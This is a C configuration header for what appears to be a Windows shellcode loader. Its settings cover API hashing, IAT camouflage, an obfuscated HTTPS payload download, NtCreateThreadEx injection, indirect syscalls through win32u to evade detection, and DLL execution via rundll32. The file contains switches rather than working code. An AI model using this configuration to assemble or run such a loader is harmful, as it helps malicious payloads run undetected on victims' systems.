#pragma once
#ifndef CONFIG_H
#define CONFIG_H


#define API_HASHING     TRUE

    #define DJB2        FALSE
    #define FNV1A32     FALSE
    #define CRC32B      TRUE


#define IAT_CAMOUFLAGE  TRUE

#define DOWNLOAD_HTTPS  TRUE
#define DOWNLOAD_HOST   { 0x00 }
#define DOWNLOAD_PORT   443
#define DOWNLOAD_URI    { 0x00 }
#define DOWNLOAD_METHOD { 0x81, 0xc6, 0x83, 0xc6, 0x92, 0xc6, 0xc6, 0xc6 } // -> GET

#define USE_PROXY       FALSE
#define DOWNLOAD_PROXY  { 0 }


#define CRYPT FALSE

    #define AES             FALSE
    #define AES_KEY         { 0x00 }
    #define AES_IV          { 0x00 }
    
    #define XChaCha20       FALSE
    #define XCHACHA20_KEY   { 0 }
    #define XCHACHA20_NONCE { 0 }


#define EXEC_INJECT_CRT TRUE // Classic Injection via NtCreateThreadEx
//#define EXEC_INJECT_MAP TODO
//#define EXEC_INJECT_APC TODO
//#define EXEC_INJECT_EARLY_BIRD TODO
//#define EXEC_INJECT_MOCKINGJAY TODO
//#define EXEC_INJECT_THREADPOOL TODO


#define EXEC_INJECT_REMOTE FALSE    // set to TRUE for remote process injection
    #define TARGET_PROCESS NOTEPAD  // uppercase process name of remote process


#define SYS_SYSCALLS        TRUE   // make In-/Direct Syscalls; if FALSE call NTAPI
#define SYS_INDIRECT        TRUE   // make indirect syscalls and call NTAPI as fallback
#define SYS_INDIRECT_WIN32U TRUE   // jmp to Win32u instead of NTDLL to make indirect syscalls


// Project Propeties -> Configuration Properties -> General -> Configuration Type -> EXE/DLL
#define EXE FALSE
#define DLL TRUE
#define XLL FALSE

// DLL Options
#define DLL_START Start     // Name of the DLL's exported StartRoutine
#define EXEC_RUNDLL32 TRUE  // Execute Loader using rundll32


#endif // CONFIG_H